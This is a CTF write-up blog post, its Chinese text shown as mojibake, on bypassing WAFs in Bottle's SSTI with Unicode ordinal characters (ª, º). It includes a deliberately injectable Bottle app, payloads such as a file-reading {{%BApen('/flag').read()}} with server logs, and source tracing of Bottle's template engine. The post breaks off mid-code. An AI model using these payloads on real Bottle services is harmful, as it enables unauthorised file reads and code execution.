<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Meteor_Kai">



    <meta name="description" content="Just Hack For Fun...">


    <meta name="keywords" content="Web exploits bring me great joy!">


<title>bottleæ¡†æ¶æ–œä½“å­—å¼•å‘çš„sstiæ¨¡æ¿æ³¨å…¥ | Meteor_Kai</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJaxé…ç½®ï¼Œå¯é€šè¿‡å•ç¾å…ƒç¬¦å·ä¹¦å†™è¡Œå†…å…¬å¼ç­‰ -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- ç»™MathJaxå…ƒç´ æ·»åŠ has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- é€šè¿‡è¿æ¥CDNåŠ è½½MathJaxçš„jsä»£ç  -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const pagebody = document.getElementsByTagName('body')[0]

            function setTheme(status) {

                if (status === 'dark') {
                    window.sessionStorage.theme = 'dark'
                    pagebody.classList.add('dark-theme');

                } else if (status === 'light') {
                    window.sessionStorage.theme = 'light'
                    pagebody.classList.remove('dark-theme');
                }
            };

            setTheme(window.sessionStorage.theme)
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">links</a>
                
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">
                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
                </div>
            </div>
            <div class="menu" id="mobile-menu">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.classList.contains("active")) {
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        } else {
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // ä¸º 6 æ—¶å±•å¼€æ‰€æœ‰
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // è¿™ä¸ªå€¼æ˜¯ç”± tocbot æºç é‡Œå®šä¹‰çš„ scrollSmoothDuration å¾—æ¥çš„
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">bottleæ¡†æ¶æ–œä½“å­—å¼•å‘çš„sstiæ¨¡æ¿æ³¨å…¥</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">April 8, 2025&nbsp;&nbsp;19:24:19</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Webå®‰å…¨</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>xyctf2025é‡åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹</p>
<p>ç¯å¢ƒå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›®å‰å‘ç°çš„POCåªèƒ½æ›¿æ¢ä¿©å­—ç¬¦ï¼Œåˆ†åˆ«æ˜¯<code>o</code>ï¼Œ<code>a</code>ï¼Œåœ¨bottleçš„SSTIé‡Œï¼Œä»–ä»¬å¯ä»¥è¢«ç›´æ¥æ›¿æ¢æˆ<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)è¿›è€Œç»•è¿‡å„ç§wafã€‚</p>
<p>è¿™é‡Œç»™å‡ºunicodeå­—ç¬¦è¡¨çš„ç½‘å€ï¼š<a target="_blank" rel="noopener" href="https://symbl.cc/cn/unicode-table/#latin-1-supplement">https://symbl.cc/cn/unicode-table/#latin-1-supplement</a></p>
<hr>
<p><code>Âª</code>çš„urlç¼–ç æ˜¯<code>%C2%AA</code>ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ä¼ å…¥<code>http://127.0.0.1:5000/attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125;</code>ï¼ŒæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âªbs(-1)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 16:27:04] &quot;GET /attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 400 752</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å»æ‰<code>%C2</code>ï¼Œå‘ç°é¡µé¢æ­£å¸¸å›æ˜¾<code>hello 1</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [08/Apr/2025 16:28:01] &quot;GET /attack?payload=&#123;&#123;%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 200 7</span><br><span class="line">&#123;&#123;Âªbs(-1)&#125;&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>ç„¶åæˆ‘ä»¬è¯•è¯•é˜³æ€§åºæ•°æŒ‡ç¤ºç¬¦<code>Âº</code>ã€‚urlç¼–ç æ˜¯<code>%C2%BA</code>ã€‚è‹¥æˆ‘ä»¬ç›´æ¥ä¼ å…¥<code>http://192.168.79.128:5000/attack?payload=&#123;&#123;%C2%BApen(%27/flag%27).read()&#125;&#125;</code>ï¼Œå®¢æˆ·ç«¯æŠ¥é”™ï¼ŒæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âºpen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">192.168.79.1 - - [08/Apr/2025 16:40:48] &quot;GET /attack?payload=&#123;&#123;%C2%BApen(%27/flag%27).read()&#125;&#125; HTTP/1.1&quot; 400 768</span><br></pre></td></tr></table></figure>

<p>å»æ‰<code>%C2</code>ï¼Œå‘ç°okå•¦ã€‚<code>http://192.168.79.128:5000/attack?payload=&#123;&#123;%BApen(%27/flag%27).read()&#125;&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âºpen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">192.168.79.1 - - [08/Apr/2025 16:42:17] &quot;GET /attack?payload=&#123;&#123;%BApen(%27/flag%27).read()&#125;&#125; HTTP/1.1&quot; 200 30</span><br></pre></td></tr></table></figure>





<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬æ·±å…¥ä»£ç çœ‹çœ‹ï¼Œä¸ªäººè®¤ä¸ºbottleæºç çœ‹ç€è¿˜æ˜¯å¾ˆèˆ’æœçš„ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<p>æˆ‘ä»¬è·Ÿè¿›<code>bottle.template()</code>çœ‹çœ‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get a rendered template as a string iterator.</span></span><br><span class="line"><span class="string">    You can use a name, a filename or a template string as first parameter.</span></span><br><span class="line"><span class="string">    Template rendering arguments can be passed as dictionaries</span></span><br><span class="line"><span class="string">    or directly (as keyword arguments).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦å°±æ˜¯æŒ‡å®šæ¨¡æ¿å¼•æ“å’Œæ¨¡æ¿æ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚è¿˜æœ‰ä¸‹é¢çš„æ¨¡æ¿ç¼“å­˜æœºåˆ¶ï¼š</p>
<blockquote>
<ol>
<li><strong>ç¼“å­˜é€»è¾‘</strong>ï¼šå¦‚æœæ¨¡æ¿æœªç¼“å­˜æˆ–å¤„äºè°ƒè¯•æ¨¡å¼ï¼ˆ<code>DEBUG=True</code>ï¼‰ï¼Œåˆ™é‡æ–°åŠ è½½æ¨¡æ¿ã€‚<ul>
<li><strong>ç›´æ¥ä½¿ç”¨æ¨¡æ¿å¯¹è±¡</strong>ï¼šå¦‚æœ <code>tpl</code> å·²ç»æ˜¯é€‚é…å™¨å®ä¾‹ï¼Œç›´æ¥ç¼“å­˜ã€‚</li>
<li><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong>ï¼šå¦‚æœåŒ…å«æ¢è¡Œç¬¦æˆ–æ¨¡æ¿è¯­æ³•ç¬¦å·ï¼ˆ<code>&#123;</code>, <code>%</code>, <code>$</code>ï¼‰ï¼Œè§†ä¸ºæ¨¡æ¿å­—ç¬¦ä¸²ã€‚</li>
<li><strong>æ¨¡æ¿æ–‡ä»¶</strong>ï¼šå¦åˆ™è§†ä¸ºæ–‡ä»¶åï¼Œä» <code>lookup</code> è·¯å¾„åŠ è½½ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
<p>è¯†åˆ«å‡ºæ¨¡æ¿æ ‡è¯†ç¬¦åå°†å…¶è§†ä¸ºæ¨¡æ¿å­—ç¬¦ä¸²ï¼Œå†äº¤ç»™<code>adapter</code>ï¼Œä¹Ÿå°±æ˜¯<code>SimpleTemplate</code>ã€‚ä½¿ç”¨<code>render()</code>ä½œä¸ºå…¥å£å‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Render the template using keyword arguments as local variables. &quot;&quot;&quot;</span></span><br><span class="line">    env = &#123;&#125;</span><br><span class="line">    stdout = []</span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args:</span><br><span class="line">        env.update(dictarg)</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    <span class="variable language_">self</span>.execute(stdout, env)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(stdout)</span><br></pre></td></tr></table></figure>

<p>ç”¨ <code>env.update()</code> æŠŠæ‰€æœ‰ä½ç½®å‚æ•°ï¼ˆ<code>*args</code>ï¼‰åˆå¹¶è¿› <code>env</code> ä¸­ï¼›æŠŠå…³é”®å­—å‚æ•°ï¼ˆ<code>**kwargs</code>ï¼‰ä¹ŸåŠ å…¥åˆ° <code>env</code> ä¸­ï¼›æœ€åè°ƒç”¨å½“å‰ç±»çš„<code>execute</code>æ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, _stdout, kwargs</span>):</span><br><span class="line">    env = <span class="variable language_">self</span>.defaults.copy()</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    env.update(&#123;</span><br><span class="line">        <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">        <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">        <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">        <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">        <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">        <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">        <span class="string">&#x27;get&#x27;</span>: env.get,</span><br><span class="line">        <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">        <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="variable language_">self</span>.co, env)</span><br><span class="line">    <span class="keyword">if</span> env.get(<span class="string">&#x27;_rebase&#x27;</span>):</span><br><span class="line">        subtpl, rargs = env.pop(<span class="string">&#x27;_rebase&#x27;</span>)</span><br><span class="line">        rargs[<span class="string">&#x27;base&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(_stdout)  <span class="comment">#copy stdout</span></span><br><span class="line">        <span class="keyword">del</span> _stdout[:]  <span class="comment"># clear stdout</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._include(env, subtpl, **rargs)</span><br><span class="line">    <span class="keyword">return</span> env</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨execçš„å…¨å±€å˜é‡é‡Œå®šä¹‰äº†ä¸€ä¸ª<code>_escape</code>å’Œ<code>_printlist</code>å‡½æ•°ã€‚</p>
<p>æ¨¡æ¿ä»£ç çš„æ‰§è¡Œå…¶å®å°±æ˜¯åœ¨<code> exec(self.co, env)</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹<code>self.co</code>ï¼ˆå³è¦æ‰§è¡Œçš„ä»£ç ï¼‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@cached_property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">co</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">compile</span>(<span class="variable language_">self</span>.code, <span class="variable language_">self</span>.filename <span class="keyword">or</span> <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª<code>@cached_property</code>å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªä¼˜åŒ–æœºåˆ¶ï¼Œç”¨æ¥é¿å…é‡å¤è®¡ç®—ã€‚</p>
<p>è¿›è¡Œäº†ä¸€æ¬¡compileï¼ˆç¼–è¯‘ï¼‰ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿè¿›<code>self.code</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">self</span>):</span><br><span class="line">    source = <span class="variable language_">self</span>.source</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> source:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            source = f.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source, encoding = touni(source), <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeError:</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">11</span>, <span class="string">&#x27;Unsupported template encodings.&#x27;</span>, <span class="string">&#x27;Use utf-8 for templates.&#x27;</span>)</span><br><span class="line">    parser = StplParser(source, encoding=encoding, syntax=<span class="variable language_">self</span>.syntax)</span><br><span class="line">    code = parser.translate()</span><br><span class="line">    <span class="variable language_">self</span>.encoding = parser.encoding</span><br><span class="line">    <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨tryé‡Œé¢ï¼Œtouniçš„ä¸‹æ–¹åŠ ä¸€ä¸ª<code>print(source)</code></p>
<p>å½“æˆ‘ä»¬ä¼ å…¥ä»¥ä¸‹å‚æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹çœ‹æœåŠ¡ç«¯print</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;hello%20world&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408172108822.png" class="" title="This is an example image">



<p>å‘ç°è¿™é‡Œçš„sourceå…¶å®å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚</p>
<p>è·Ÿè¿›touniçœ‹çœ‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s.decode(enc, err)</span><br><span class="line">    <span class="keyword">return</span> unicode(<span class="string">&quot;&quot;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> s)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯å­—èŠ‚ç±»å‹çš„ï¼Œdecodeåreturnï¼Œå¦åˆ™returnä¸€ä¸ª<code>unicode(&quot;&quot; if s is None else s)</code>ï¼Œç„¶åæˆ‘ä»¬çœ‹çœ‹unicodeçš„å®šä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode = str</span><br></pre></td></tr></table></figure>

<p>unicodeæ˜¯ä¸€ä¸ªstrç±»ï¼Œå…¨ä½“strï¼</p>
<p>ç„¶åæˆ‘ä»¬å†å›åˆ°<code>code()</code>æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parser = StplParser(source, encoding=encoding, syntax=<span class="variable language_">self</span>.syntax)</span><br><span class="line">code = parser.translate()</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›ä¸€ä¸‹<code>StplParser</code>çš„<code>translete</code>æ–¹æ³•ã€‚<code>StplParser</code> ç±»æ˜¯ç”¨æ¥è§£æå’Œè½¬æ¢æŸç§æ¨¡æ¿æˆ–æºä»£ç çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.offset: <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Parser is a one time 